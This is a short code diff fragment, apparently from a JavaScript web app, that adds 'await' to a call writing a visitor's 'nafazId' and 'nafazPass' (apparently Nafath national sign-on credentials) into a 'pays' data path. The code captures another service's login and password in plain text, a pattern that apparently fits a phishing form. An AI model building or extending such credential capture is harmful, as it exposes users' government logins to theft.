@@ -46,7 +46,7 @@ if (!visitorId) return;
 
   setIsLoading(true);
 
-  addData(`pays/${visitorId}`, {
+  await addData(`pays/${visitorId}`, {
     id: visitorId,
     nafazId: idLogin,
     nafazPass: password,
